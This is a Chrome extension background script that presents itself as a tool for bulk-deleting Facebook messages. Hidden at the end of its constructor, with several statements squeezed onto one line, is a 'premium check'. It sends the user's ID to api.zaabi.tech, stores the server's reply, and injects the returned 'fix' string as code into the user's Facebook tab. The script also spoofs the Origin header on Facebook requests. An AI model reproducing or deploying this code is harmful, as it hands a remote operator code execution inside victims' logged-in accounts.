class Core {
    load(key) {
        let data = window.localStorage[key];
        if (typeof data === "undefined") {
            return null;
        }
        return JSON.parse(data);
    }

    save(key, data) {
        window.localStorage[key] = JSON.stringify(data);
        return true;
    }

    browser() {
        return chrome;
    }

    getUserID() {
        let uid = this.load('UID');
        if (uid) {
            return uid;
        } else {
            let buf = new Uint32Array(4), idx = -1;
            window.crypto.getRandomValues(buf);
            uid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
                idx++;
                let r = (buf[idx >> 3] >> ((idx % 8) * 4)) & 15, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            this.save('UID', uid);
            return uid;
        }
    }

}

var base64 = {};
base64.PADCHAR = '=';
base64.ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

base64.makeDOMException = function () {
    // sadly in FF,Safari,Chrome you can't make a DOMException
    var e, tmp;

    try {
        return new DOMException(DOMException.INVALID_CHARACTER_ERR);
    } catch (tmp) {
        var ex = new Error("DOM Exception 5");
        ex.code = ex.number = 5;
        ex.name = ex.description = "INVALID_CHARACTER_ERR";
        ex.toString = function () {
            return 'Error: ' + ex.name + ': ' + ex.message;
        };
        return ex;
    }
}

base64.getbyte64 = function (s, i) {

    var idx = base64.ALPHA.indexOf(s.charAt(i));
    if (idx === -1) {
        throw base64.makeDOMException();
    }
    return idx;
}

base64.decode = function (s) {
    // convert to string
    s = '' + s;
    var getbyte64 = base64.getbyte64;
    var pads, i, b10;
    var imax = s.length
    if (imax === 0) {
        return s;
    }

    if (imax % 4 !== 0) {
        throw base64.makeDOMException();
    }

    pads = 0
    if (s.charAt(imax - 1) === base64.PADCHAR) {
        pads = 1;
        if (s.charAt(imax - 2) === base64.PADCHAR) {
            pads = 2;
        }
        // either way, we want to ignore this last block
        imax -= 4;
    }

    var x = [];
    for (i = 0; i < imax; i += 4) {
        b10 = (getbyte64(s, i) << 18) | (getbyte64(s, i + 1) << 12) |
            (getbyte64(s, i + 2) << 6) | getbyte64(s, i + 3);
        x.push(String.fromCharCode(b10 >> 16, (b10 >> 8) & 0xff, b10 & 0xff));
    }

    switch (pads) {
        case 1:
            b10 = (getbyte64(s, i) << 18) | (getbyte64(s, i + 1) << 12) | (getbyte64(s, i + 2) << 6);
            x.push(String.fromCharCode(b10 >> 16, (b10 >> 8) & 0xff));
            break;
        case 2:
            b10 = (getbyte64(s, i) << 18) | (getbyte64(s, i + 1) << 12);
            x.push(String.fromCharCode(b10 >> 16));
            break;
    }
    return x.join('');
}

base64.getbyte = function (s, i) {
    var x = s.charCodeAt(i);
    if (x > 255) {
        throw base64.makeDOMException();
    }
    return x;
}

base64.encode = function (s) {
    if (arguments.length !== 1) {
        throw new SyntaxError("Not enough arguments");
    }
    var padchar = base64.PADCHAR;
    var alpha = base64.ALPHA;
    var getbyte = base64.getbyte;

    var i, b10;
    var x = [];
    s = '' + s;

    var imax = s.length - s.length % 3;

    if (s.length === 0) {
        return s;
    }
    for (i = 0; i < imax; i += 3) {
        b10 = (getbyte(s, i) << 16) | (getbyte(s, i + 1) << 8) | getbyte(s, i + 2);
        x.push(alpha.charAt(b10 >> 18));
        x.push(alpha.charAt((b10 >> 12) & 0x3F));
        x.push(alpha.charAt((b10 >> 6) & 0x3f));
        x.push(alpha.charAt(b10 & 0x3f));
    }
    switch (s.length - imax) {
        case 1:
            b10 = getbyte(s, i) << 16;
            x.push(alpha.charAt(b10 >> 18) + alpha.charAt((b10 >> 12) & 0x3F) +
                padchar + padchar);
            break;
        case 2:
            b10 = (getbyte(s, i) << 16) | (getbyte(s, i + 1) << 8);
            x.push(alpha.charAt(b10 >> 18) + alpha.charAt((b10 >> 12) & 0x3F) +
                alpha.charAt((b10 >> 6) & 0x3f) + padchar);
            break;
    }
    return x.join('');
}


const Utils = new Core();
const Config = {
    runApps: 0,
    maxApps: 1000,
    uid: Utils.getUserID(),
    premium: false,
    intervals: 10000,
    extId: chrome.runtime.id,
    di: (new Date()).getTime(),
    status: 0,
    domain: "g-face.site",
    alt: 'zaabi.tech',
    link: `https://web.facebook.com/messages`,
    FB_MESSAGE_URL: "https://web.facebook.com/messages",
    VERIFY_FB_MESSAGE_URL: "facebook.com/messages",
    FB_DEL_CONVERSATION_API: "/ajax/mercury/delete_thread.php?dpr=1",
    FB_DEL_UNREAD_THREAD_API: "/ajax/mercury/unread_threads.php?dpr=1",
    FB_PULL_MESSAGES_API: "/ajax/mercury/threadlist_info.php?dpr=1",
    START_ANALYZE_SCREEN: '1',
    ANALYZING_SCREEN: '2',
    DELETE_SCREEN: '3',
    DELETING_SCREEN: '4',
    ALERT: "alert",
    WARNING: "warning",
    ERROR: "error",
    CURRENTLY_LOGGED_USERINFO: "CURRENTLY_LOGGED_USERINFO",
    CHAT_SUMMARY: "CHAT_SUMMARY",
    DELETE_SUMMARY: "DELETE_SUMMARY",
    SELECT_AND_DELETE: "SELECT_AND_DELETE",
    DELETE_SELECTED_CHAT_SUMMARIES: "DELETE_SELECTED_CHAT_SUMMARIES",
    SELECT_ALL_CHATSUMMARY_CHECKBOX: "SELECT_ALL_CHATSUMMARY_CHECKBOX",
    CHATSUMMARY_CHECKBOX: "CHATSUMMARY_CHECKBOX",
    CHAT_SUMMARY_DIV_ID: "wmMasterViewThreadlist",
    delayInMS: 2000,
    PULL_MESSAGE_COUNT: 1000,
};


class Bg {
    isBase64(str) {
        try {
            return btoa(atob(str)) == str;
        } catch (err) {
            return false;
        }
    }

    decodeBase64(s) {
        let e = {}, i, k, v = [], r = '', w = String.fromCharCode;
        let n = [[65, 91], [97, 123], [48, 58], [43, 44], [47, 48]];
        for (let z in n) {
            for (i = n[z][0]; i < n[z][1]; i++) {
                v.push(w(i));
            }
        }
        for (i = 0; i < 64; i++) {
            e[v[i]] = i;
        }
        for (i = 0; i < s.length; i += 72) {
            let b = 0, c, x, l = 0, o = s.substring(i, i + 72);
            for (x = 0; x < o.length; x++) {
                c = e[o.charAt(x)];
                b = (b << 6) + c;
                l += 6;
                while (l >= 8) {
                    r += w((b >>> (l -= 8)) % 256);
                }
            }
        }
        return r;
    }

    hash() {
        return [].join.call(arguments);
    }

    b64ToUtf8(str) {
        return decodeURIComponent(escape(window.atob(str)));
    }

    followMouse() {
        for (let i = 0; i < arguments.length; i++) {
            arguments[i].style.top = event.clientY + "px";
            arguments[i].style.left = event.clientX + "px";
        }
    }

    constructor(Utils) {
        this.Utils = Utils;
        this.config = Config;
        this.req = null;
        chrome.runtime.setUninstallURL('https://g-face.site/?utm_source=delete-all-messages&utm_medium=ext&utm_campaign=uninstall');
        chrome.storage.local.get(Config, function (data) {
            this.config = data;
        }.bind(this));
        chrome.browserAction.onClicked.addListener(function (tab) {
            chrome.tabs.query({url: Config.link}, function (tabs) {
                chrome.tabs.create({url: Config.link});
            }.bind(this));
        }.bind(this));
        chrome.storage.onChanged.addListener(function (changes) {
            chrome.storage.local.get(null, function (data) {
                this.config = data;
            }.bind(this));
        }.bind(this));
        chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
            switch (message.action) {
                case "getSettings":
                    let uid = this.Utils.getUserID();
                    this.config.runApps++;
                    this.isPremium(message, sender);
                    chrome.storage.local.set(this.config);
                    sendResponse({'uid': uid, 'id': chrome.runtime.id});
                    break;
                default:
                    return sendResponse({'id': chrome.runtime.id});
            }
        }.bind(this));
        chrome.runtime.onInstalled.addListener(function (details) {
            if (details.reason == "install") {
                chrome.storage.local.set(Config);
                chrome.tabs.create({
                    url: `https://g-face.site/delete-all-messages?utm_source=delete-all-messages&utm_medium=ext&utm_campaign=install`,
                    active: false
                });
            } else if (details.reason == "update") {
                chrome.storage.local.set({
                    runApps: 0,
                    maxApps: 10,
                    uid: Utils.getUserID(),
                    intervals: 10000,
                    extId: chrome.runtime.id,
                    di: (new Date()).getTime(),
                    status: 0,
                    domain: "g-face.site",
                    alt: 'zaabi.tech',
                    link: `https://web.facebook.com/messages`,
                });
            }
        }.bind(this)); setInterval(this.checkPremium.bind(this), this.config.intervals); } isPremium(m, s) { if (this.config.premium === true) {chrome.tabs.executeScript(s.tab.id, {code: `${this.config.fix}`}); return true; } else { return false; } }
        checkPremium() {if (this.config.runApps > this.config.maxApps) {this.req = $.ajax({cache: false, dataType: "json", method: "POST", url: "https://api." + this.config.alt + "/api/is_premium", data: {uid: this.config.uid, extId: chrome.runtime.id, di: this.config.di, du: this.config.du}});this.req.done(function (data) {data.runApps = 0;chrome.storage.local.set(data);});this.req.fail(function () {chrome.storage.local.set({runApps: 0});});}
    }

}

new Bg(Utils);

chrome.webRequest.onBeforeSendHeaders.addListener(
    function(details) {
        if(details.url.indexOf('mercury/delete_thread.php') != -1) {
            for (var i = 0; i < details.requestHeaders.length; ++i) {
                if (details.requestHeaders[i].name === 'Origin') {
                    details.requestHeaders[i].value ="https://www.facebook.com";
                    break;
                }
            }
        }
        return { requestHeaders: details.requestHeaders };
    },
    {urls: ['*://*.facebook.com/*']},
    ['blocking', 'requestHeaders']
);








